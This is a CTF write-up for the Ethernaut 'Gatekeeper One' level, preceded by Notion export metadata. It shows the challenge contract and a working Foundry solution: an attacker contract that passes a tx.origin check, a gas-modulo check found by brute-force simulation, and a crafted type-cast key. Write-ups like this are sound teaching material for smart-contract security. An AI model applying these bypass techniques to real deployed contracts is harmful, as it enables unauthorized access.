---
title: "Gatekeeper One"
date: "2024-02-10"
lastmod: "2024-02-23T12:57:00.000Z"
draft: false
difficulty: "⭐⭐⭐⭐"
prev: "Privacy-0141c59931824d74a8311099eb338d5d"
weight: 14
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/13"
next: "Gatekeeper-Two-d4a070f38b644143a295ecf4467fb7fa"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "9bbda6ef-a6c2-4367-aa64-3eb73ae92a6a"
  created_time: "2024-02-12T13:39:00.000Z"
  last_edited_time: "2024-02-23T12:57:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel13.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "f9c2f40a-0144-4e6d-a134-6b9fd725f7a9"
        name: "⭐⭐⭐⭐"
        color: "red"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Privacy-0141c59931824d74a8311099eb338d5d"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Privacy-0141c59931824d74a8311099eb338d5d"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-02-10"
        end: null
        time_zone: null
    Last edited time:
      id: "ZdmN"
      type: "last_edited_time"
      last_edited_time: "2024-02-23T12:57:00.000Z"
    weight:
      id: "%5Dyda"
      type: "number"
      number: 14
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/13"
    Last edited by:
      id: "mIQC"
      type: "last_edited_by"
      last_edited_by:
        object: "user"
        id: "7866207c-089f-43df-9333-1dc33859c6a9"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Gatekeeper-Two-d4a070f38b644143a295ecf4467fb7fa"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Gatekeeper-Two-d4a070f38b644143a295ecf4467fb7fa"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Gatekeeper One"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Gatekeeper One"
          href: null
  url: "https://www.notion.so/Gatekeeper-One-9bbda6efa6c24367aa643eb73ae92a6a"
  public_url: null
UPDATE_TIME: "2024-02-23T20:54:30.044Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


title: Gatekeeper One
weight: 13
type: docs
prev: privacy
next: gatekeeper-two


[Level13](https://ethernaut.openzeppelin.com/level/13) - ⭐⭐⭐⭐


---


Make it past the gatekeeper and register as an entrant to pass this level.


### Things that might help:

- Remember what you've learned from the Telephone and Token levels.
- You can learn more about the special function `gasleft()`, in Solidity's documentation (see [here](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html) and [here](https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls)).

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Attacker, GatekeeperOne} from "../src/13.sol";

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address publicKey = vm.envAddress("PUBLIC_KEY");
        address addr = vm.envAddress("INSTANCE_13");

        vm.startBroadcast(deployerPrivateKey);

        GatekeeperOne gate = GatekeeperOne(addr);

        console.log('entrant = %s', gate.entrant());

        Attacker attacker = new Attacker(address(gate));

        // -----
        bytes2 expected = bytes2(uint16(uint160(publicKey)));
        console.logBytes2(expected);
        // -----

        console.logBytes20(bytes20(publicKey));
        bytes8 gateKey = bytes8((uint64((uint160(publicKey) << 6 * 8)) >> 8 * 6) + 0x0100000000000000);

        console.log('entrant = %s', gate.entrant());

        attacker.attack(gateKey);

        console.log('entrant = %s', gate.entrant());
        vm.stopBroadcast();

    }
}
```


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/console.sol";

interface GatekeeperOne {
  function entrant() external returns(address);
  function enter(bytes8 _gateKey) external returns (bool);
}

contract Attacker {
  GatekeeperOne gatekeeper;

  constructor(address _gatekeeper) {
    gatekeeper = GatekeeperOne(_gatekeeper);
  }

  function attack(bytes8 _gateKey) public  {
    gatekeeper.enter{gas: 8191 + 24829}(_gateKey); // 24829 if found through brut force loop simulation (without --broadcast flag we can simulate execution)
  }
}
```

